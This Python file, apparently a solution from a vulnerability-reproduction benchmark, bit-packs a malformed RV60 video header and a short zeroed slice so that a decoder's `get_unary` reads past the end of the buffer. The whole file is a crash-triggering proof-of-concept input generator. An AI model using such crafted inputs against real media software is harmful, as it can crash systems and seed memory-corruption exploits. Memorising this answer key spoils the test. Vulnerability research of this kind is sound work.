import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class _BitWriter:
            def __init__(self):
                self.bits = []

            def write(self, val: int, nbits: int):
                for i in range(nbits - 1, -1, -1):
                    self.bits.append((val >> i) & 1)

            def get_bytes(self) -> bytes:
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                b = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte_val = 0
                    for j in range(8):
                        byte_val |= self.bits[i + j] << (7 - j)
                    b.append(byte_val)
                return bytes(b)

        bw = _BitWriter()

        # Craft an 8-byte RV60 Picture Header.
        # The header specifies a single slice with a size that will lead to an OOB read.
        bw.write(0, 2)      # ptype: INTRA frame
        bw.write(1, 1)      # marker bit
        bw.write(0, 13)     # timestamp
        bw.write(1, 1)      # marker bit
        bw.write(0, 10)     # width: (0+1)<<4 = 16
        bw.write(0, 10)     # height: (0+1)<<4 = 16
        bw.write(0, 8)      # temporal reference
        bw.write(1, 1)      # marker bit
        bw.write(0, 8)      # num_slices - 1: 0 for 1 slice

        # The vulnerability is an over-read in get_unary within the slice header parsing.
        # get_unary reads up to 32 bits (4 bytes) of zeros.
        # By setting the slice size to less than 4 bytes, the read goes out of bounds.
        # We choose a slice size of 3 bytes.
        slice_size = 3
        
        # Encode the slice size using the format's variable-length code.
        # For a value of 3, the encoding is get_bits(2) -> 3, then get_bits(8) -> (3-3)=0.
        bw.write(3, 2)
        bw.write(slice_size - 3, 8)

        header = bw.get_bytes()

        # The slice data itself consists of zeros to make get_unary read continuously.
        slice_data = b'\x00' * slice_size

        return header + slice_data
